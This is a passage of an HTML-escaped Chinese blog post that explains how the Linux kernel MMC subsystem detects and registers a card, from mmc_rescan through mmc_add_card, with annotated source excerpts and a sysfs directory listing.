    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_PRESCAN_POWERUP)) {
        mmc_claim_host(host);
        mmc_power_up(host, host&lt;/span&gt;-&amp;gt;&lt;span&gt;ocr_avail);
        mmc_release_host(host);
    }

    mmc_gpiod_request_cd_irq(host);
    _mmc_detect_change(host, &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;rescan_disable = &lt;span&gt;0&lt;/span&gt;&lt;/span&gt; 使能主设备的重新检测。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;未使能 &lt;span class=&quot;cnblogs_code&quot;&gt;MMC_CAP2_NO_PRESCAN_POWERU&lt;/span&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;P&lt;/code&gt;时，将完成 &lt;span class=&quot;cnblogs_code&quot;&gt;claim_host()&lt;/span&gt; 、 &lt;span class=&quot;cnblogs_code&quot;&gt;power_up()&lt;/span&gt; 、 &lt;span class=&quot;cnblogs_code&quot;&gt;release_host()&lt;/span&gt; 等一系列工作。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_gpiod_request_cd_irq()&lt;/span&gt; 用于为host申请中断号（和GPIO口对应），并绑定中断服务函数。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;_mmc_detect_change(host, &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;)&lt;/span&gt; 用于检测MMC槽位上的变动。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_claim_host(host)&lt;/span&gt; 函数用于申请获得host（主控制器）的使用权，进程将进入休眠等待状态，直至可以获得主控制器的使用权。该函数结合 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_release_host(host)&lt;/span&gt; ，利用等待队列实现，原理细节可以参考：&lt;a href=&quot;https://www.cnblogs.com/hueyxu/p/13745029.html&quot;&gt;Linux等待队列（Wait Queue）&lt;/a&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;45-_mmc_detect_changehost-0-false&quot;&gt;&lt;span&gt;4.5 _mmc_detect_change(host, 0, false)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;15&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; _mmc_detect_change(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, unsigned &lt;span&gt;long&lt;/span&gt; delay, &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; cd_irq)
{
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (cd_irq &amp;amp;&amp;amp; !(host-&amp;gt;caps &amp;amp; MMC_CAP_NEEDS_POLL) &amp;amp;&amp;amp;&lt;span&gt;
            device_can_wakeup(mmc_dev(host)))
        pm_wakeup_event(mmc_dev(host), &lt;/span&gt;&lt;span&gt;5000&lt;/span&gt;&lt;span&gt;);

    host&lt;/span&gt;-&amp;gt;detect_change = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    mmc_schedule_delayed_work(&lt;/span&gt;&amp;amp;host-&amp;gt;&lt;span&gt;detect, delay);
}

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_schedule_delayed_work(&lt;span&gt;struct&lt;/span&gt; delayed_work *work, unsigned &lt;span&gt;long&lt;/span&gt;&lt;span&gt; delay)
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; queue_delayed_work(system_freezable_wq, work, delay);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;_mmc_detect_change()&lt;/span&gt; 函数用来检测MMC状态的改变，具体是通过调度工作队列实现，如4.2一节介绍， &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan()&lt;/span&gt; 作为处理函数被绑定在延迟工作队列 &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;detect&lt;/span&gt; 上。因此，此处实际上是启动 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan()&lt;/span&gt; 的执行过程。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;46-mmc_rescanhost-detect&quot;&gt;&lt;span&gt;4.6 mmc_rescan(&amp;amp;host-&amp;gt;detect)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;21&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;void&lt;/span&gt; mmc_rescan(&lt;span&gt;struct&lt;/span&gt; work_struct *&lt;span&gt;work)
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 通过host-&amp;gt;detect指针得到mmc_host结构体指针&lt;/span&gt;
    &lt;span&gt;struct&lt;/span&gt; mmc_host *host = container_of(work, &lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_host, detect.work);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果rescan被禁止，函数提前返回&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (host-&amp;gt;&lt;span&gt;rescan_disable)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 对于不可移除(non-removable)的host，如果其正在做rescan工作时，函数提前返回（scan只做一次）&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!mmc_card_is_removable(host) &amp;amp;&amp;amp; host-&amp;gt;&lt;span&gt;rescan_entered)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 基本检查通过，进入rescan流程，标记rescan_entered&lt;/span&gt;
    host-&amp;gt;rescan_entered = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    ... ...
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 检查可移除(removable) host是否还存在&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (host-&amp;gt;bus_ops &amp;amp;&amp;amp; !host-&amp;gt;bus_dead &amp;amp;&amp;amp;&lt;span&gt; mmc_card_is_removable(host))
        host&lt;/span&gt;-&amp;gt;bus_ops-&amp;gt;&lt;span&gt;detect(host);

    host&lt;/span&gt;-&amp;gt;detect_change = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ... ...

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 尝试获得host的使用权，实现原理在4.4小节中有提及&lt;/span&gt;
&lt;span&gt;    mmc_claim_host(host);
    ... ...

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; rescan流程的关键步骤，依次尝试四个给定频率，直至检测到mmc card的存在
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; static const unsigned freqs[] = { 400000, 300000, 200000, 100000 }&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; ARRAY_SIZE(freqs); i++&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!mmc_rescan_try_freq(host, max(freqs[i], host-&amp;gt;&lt;span&gt;f_min)))
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (freqs[i] &amp;lt;= host-&amp;gt;&lt;span&gt;f_min)
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
    }
    mmc_release_host(host);
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_rescan_try_freq(&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host, unsigned freq)
{
    host&lt;/span&gt;-&amp;gt;f_init =&lt;span&gt; freq;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 完成一系列初始化步骤，保证设备在合适的运行状态，为后面实际探测做准备&lt;/span&gt;
    mmc_power_up(host, host-&amp;gt;&lt;span&gt;ocr_avail);
    mmc_hw_reset_for_init(host);
    ... ...
    mmc_go_idle(host);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_SD))
        mmc_send_if_cond(host, host&lt;/span&gt;-&amp;gt;&lt;span&gt;ocr_avail);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Order's important: probe SDIO, then SD, then MMC &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 依次探测设备：SDIO，SD，MMC
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 对于MMC设备，尝试调用mmc_attach_mmc(host)&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_SDIO))
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;mmc_attach_sdio(host))
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_SD))
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;mmc_attach_sd(host))
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_MMC))
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;mmc_attach_mmc(host))
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    mmc_power_off(host);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -&lt;span&gt;EIO;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan(&amp;amp;host-&amp;gt;detect)&lt;/span&gt; 会调用 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan_try&lt;span&gt;_freq(host, max(freqs[i], host-&amp;gt;f_min))&lt;/span&gt;&lt;/span&gt;&lt;span&gt; ，进一步调用重要的 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_attach_mmc(host)&lt;/span&gt; 函数，将MMC设备加入到驱动模型中。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;47-mmc_attach_mmchost&quot;&gt;&lt;span&gt;4.7 mmc_attach_mmc(&amp;amp;host)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;19&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;52&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; mmc_bus相关的一系列operations函数&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_bus_ops mmc_ops =&lt;span&gt; {
    .remove &lt;/span&gt;=&lt;span&gt; mmc_remove,
    .detect &lt;/span&gt;=&lt;span&gt; mmc_detect,
    .suspend &lt;/span&gt;=&lt;span&gt; mmc_suspend,
    .resume &lt;/span&gt;=&lt;span&gt; mmc_resume,
    .runtime_suspend &lt;/span&gt;=&lt;span&gt; mmc_runtime_suspend,
    .runtime_resume &lt;/span&gt;=&lt;span&gt; mmc_runtime_resume,
    .alive &lt;/span&gt;=&lt;span&gt; mmc_alive,
    .shutdown &lt;/span&gt;=&lt;span&gt; mmc_shutdown,
    .hw_reset &lt;/span&gt;=&lt;span&gt; _mmc_hw_reset,
};

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; MMC card初始化的入口函数&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; mmc_attach_mmc(&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;
    u32 ocr, rocr;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 首先检查host的使用权是否已经获得&lt;/span&gt;
    WARN_ON(!host-&amp;gt;&lt;span&gt;claimed);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Set correct bus mode for MMC before attempting attach &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;mmc_host_is_spi(host))
        mmc_set_bus_mode(host, MMC_BUSMODE_OPENDRAIN);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; OCR register获得，可参考MMC设备操作规范&lt;/span&gt;
    err = mmc_send_op_cond(host, &lt;span&gt;0&lt;/span&gt;, &amp;amp;&lt;span&gt;ocr);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将host结构成员bus_ops设置为mmc_ops&lt;/span&gt;
    mmc_attach_bus(host, &amp;amp;&lt;span&gt;mmc_ops);
    ... ... 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为host选择合适的工作电压&lt;/span&gt;
    rocr =&lt;span&gt; mmc_select_voltage(host, ocr);

    ... ... 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关键步骤1：开始初始化MMC card的流程&lt;/span&gt;
    err =&lt;span&gt; mmc_init_card(host, rocr, NULL);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; MMC card初始化后释放host的使用权，起初在mmc_rescan()函数中获得&lt;/span&gt;
&lt;span&gt;    mmc_release_host(host);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关键步骤2：将MMC card注册进设备驱动模型中&lt;/span&gt;
    err = mmc_add_card(host-&amp;gt;&lt;span&gt;card);

    mmc_claim_host(host);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ... ... 
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_attach_mmc(&amp;amp;host)&lt;/span&gt; 作为MMC card检测和初始化的关键函数，执行的步骤可概括为：&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;获取MMC基本硬件初始化信息，例如OCR register （工作电压相关）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;初始化host-&amp;gt;bus_ops成员， &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;bus_ops = &amp;amp;mmc_ops&lt;/span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init_card(host, rocr, NULL)&lt;/span&gt; ：MMC card初始化，下文详细介绍&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_card(host-&amp;gt;card)&lt;/span&gt; ：将MMC card加入到设备驱动模型中，下文将详细介绍&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;48-mmc_init_mmchost-rocr-null&quot;&gt;&lt;span&gt;4.8 mmc_init_mmc(&amp;amp;host, rocr, NULL)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;34&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;23.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; device_type mmc_type =&lt;span&gt; {
    .groups &lt;/span&gt;=&lt;span&gt; mmc_std_groups,
};

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_init_card(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, u32 ocr, &lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;oldcard)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;
    u32 cid[&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;&lt;span&gt;];
    u32 rocr;

    WARN_ON(&lt;/span&gt;!host-&amp;gt;&lt;span&gt;claimed);

    ... ...
    mmc_go_idle(host);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; The extra bit indicates that we support high capacity &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    err &lt;/span&gt;= mmc_send_op_cond(host, ocr | (&lt;span&gt;1&lt;/span&gt; &amp;lt;&amp;lt; &lt;span&gt;30&lt;/span&gt;), &amp;amp;&lt;span&gt;rocr);

    ... ... 
    err &lt;/span&gt;=&lt;span&gt; mmc_send_cid(host, cid);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (oldcard) {
        ...
        card &lt;/span&gt;=&lt;span&gt; oldcard;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
         &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 动态分配mmc_card结构&lt;/span&gt;
        card = mmc_alloc_card(host, &amp;amp;&lt;span&gt;mmc_type);

        card&lt;/span&gt;-&amp;gt;ocr =&lt;span&gt; ocr;
        card&lt;/span&gt;-&amp;gt;type =&lt;span&gt; MMC_TYPE_MMC;
        card&lt;/span&gt;-&amp;gt;rca = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
        memcpy(card&lt;/span&gt;-&amp;gt;raw_cid, cid, &lt;span&gt;sizeof&lt;/span&gt;(card-&amp;gt;&lt;span&gt;raw_cid));
    }

    ... ...
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt; mmc_card *mmc_alloc_card(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, &lt;span&gt;struct&lt;/span&gt; device_type *&lt;span&gt;type)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card;

    card &lt;/span&gt;= kzalloc(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_card), GFP_KERNEL);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;card)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; ERR_PTR(-&lt;span&gt;ENOMEM);

    card&lt;/span&gt;-&amp;gt;host =&lt;span&gt; host;

    device_initialize(&lt;/span&gt;&amp;amp;card-&amp;gt;&lt;span&gt;dev);

    card&lt;/span&gt;-&amp;gt;dev.parent =&lt;span&gt; mmc_classdev(host);
    card&lt;/span&gt;-&amp;gt;dev.bus = &amp;amp;&lt;span&gt;mmc_bus_type;
    card&lt;/span&gt;-&amp;gt;dev.release =&lt;span&gt; mmc_release_card;
    card&lt;/span&gt;-&amp;gt;dev.type =&lt;span&gt; type;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; card;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init_mmc(&amp;amp;host, rocr, NULL)&lt;/span&gt; 会调用 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_alloc_card(host, &amp;amp;mmc_type)&lt;/span&gt; 动态分配一个 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card&lt;/span&gt; 结构，并初始化其内部的 &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; device&lt;/span&gt; 结构。此外， &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init_mmc()&lt;/span&gt; 中还完成了许多初始化工作，这些工作大多是依据MMC操作规范定义的，在此不详细介绍。&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card&lt;/span&gt; 结构成员大致列举如下，以方便分析。&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt; mmc_card card =&lt;span&gt; {
    .host &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc;

    .dev &lt;/span&gt;=&lt;span&gt; {
        .parent     &lt;/span&gt;= mmc_classdev(mmc) = &amp;amp;&lt;span&gt;(mmc.class_dev);
        .bus        &lt;/span&gt;= &amp;amp;mmc_bus_type =&lt;span&gt; {
            .name       &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            .dev_groups &lt;/span&gt;=&lt;span&gt; mmc_dev_groups,
            .match      &lt;/span&gt;=&lt;span&gt; mmc_bus_match,
            .uevent     &lt;/span&gt;=&lt;span&gt; mmc_bus_uevent,
            .probe      &lt;/span&gt;=&lt;span&gt; mmc_bus_probe,
            .remove     &lt;/span&gt;=&lt;span&gt; mmc_bus_remove,
            .shutdown   &lt;/span&gt;=&lt;span&gt; mmc_bus_shutdown,
            .pm         &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc_bus_pm_ops,
        };

        .release    &lt;/span&gt;=&lt;span&gt; mmc_release_card;
        .type       &lt;/span&gt;= &amp;amp;mmc_type =&lt;span&gt; {
            .groups &lt;/span&gt;=&lt;span&gt; mmc_std_groups,
        };
    }
    .ocr            &lt;/span&gt;=&lt;span&gt; rocr;
    .type           &lt;/span&gt;=&lt;span&gt; MMC_TYPE_MMC;
    .rca            &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;;                &lt;span&gt;//&lt;/span&gt;&lt;span&gt; relative card address of device&lt;/span&gt;
};
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;49-mmc_add_cardhost-card&quot;&gt;&lt;span&gt;4.9 mmc_add_card(host-&amp;gt;card)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;int&lt;/span&gt; mmc_add_card(&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; ret;

    ... ...
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; #define mmc_hostname(x) (dev_name(&amp;amp;(x)-&amp;gt;class_dev))
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为card-&amp;gt;dev设置名称“mmc0:0001”，实际上设置了card-&amp;gt;dev-&amp;gt;kobj.name = “mmc0:0001”&lt;/span&gt;
    dev_set_name(&amp;amp;card-&amp;gt;dev, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%s:%04x&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, mmc_hostname(card-&amp;gt;host), card-&amp;gt;&lt;span&gt;rca);

    ... ...
    card&lt;/span&gt;-&amp;gt;dev.of_node = mmc_of_find_child_device(card-&amp;gt;host, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    device_enable_async_suspend(&lt;/span&gt;&amp;amp;card-&amp;gt;&lt;span&gt;dev);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 关键步骤：通过device_add() 将mmc card注册到设备驱动模型中&lt;/span&gt;
    ret = device_add(&amp;amp;card-&amp;gt;&lt;span&gt;dev);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 标记mmc card状态为PRESENT，card-&amp;gt;state = MMC_STATE_PRESENT&lt;/span&gt;
&lt;span&gt;    mmc_card_set_present(card);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这里最关键的一步是熟悉的 &lt;span class=&quot;cnblogs_code&quot;&gt;device_add(&amp;amp;card-&amp;gt;dev)&lt;/span&gt; 函数，它将mmc card添加到驱动模型中。注意到 &lt;span class=&quot;cnblogs_code&quot;&gt;card.dev&lt;/span&gt; 的 &lt;span class=&quot;cnblogs_code&quot;&gt;parent&lt;/span&gt; 被设置为 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc.class_dev&lt;/span&gt; ，所以将在前述host的目录层次下建立新的名为 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc0:&lt;span&gt;0001&lt;/span&gt;&lt;/span&gt; 的 &lt;span class=&quot;cnblogs_code&quot;&gt;card&lt;/span&gt; 子目录，而在调用 &lt;span class=&quot;cnblogs_code&quot;&gt;bus_add_device()&lt;/span&gt; 时，在mmc bus目录下子目录 &lt;span class=&quot;cnblogs_code&quot;&gt;devices&lt;/span&gt; 建立相应的链接，链接到上述 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc0:&lt;span&gt;0001&lt;/span&gt;&lt;/span&gt; 的设备目录上。sysfs的整体目录层次表现如下：&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
/sys/devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/mmc0:&lt;span&gt;0001&lt;/span&gt;&lt;span&gt;$ ll
total &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
 ... ...  block&lt;/span&gt;/&lt;span&gt;
 ... ...  
 ... ...  driver &lt;/span&gt;-&amp;gt; ../../../../../../bus/mmc/drivers/mmcblk/&lt;span&gt;
 ... ...
 ... ...  subsystem &lt;/span&gt;-&amp;gt; ../../../../../../bus/mmc/&lt;span&gt;
 ... ...
 ... ...  uevent

&lt;/span&gt;/sys/bus/mmc/&lt;span&gt;devices$ ll
 ... ...  mmc0:&lt;/span&gt;&lt;span&gt;0001&lt;/span&gt; -&amp;gt; ../../../devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/mmc0:&lt;span&gt;0001&lt;/span&gt;/


/sys/bus/mmc/drivers/&lt;span&gt;mmcblk$ ll
 ... ...  mmc0:&lt;/span&gt;&lt;span&gt;0001&lt;/span&gt; -&amp;gt; ../../../../devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/mmc0:&lt;span&gt;0001&lt;/span&gt;/

/sys/&lt;span&gt;class&lt;/span&gt;/&lt;span&gt;mmc_host$ ll
 ... ...  mmc0 &lt;/span&gt;-&amp;gt; ../../devices/platform/klm_emmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/ 
&lt;/pre&gt;&lt;/div&gt;
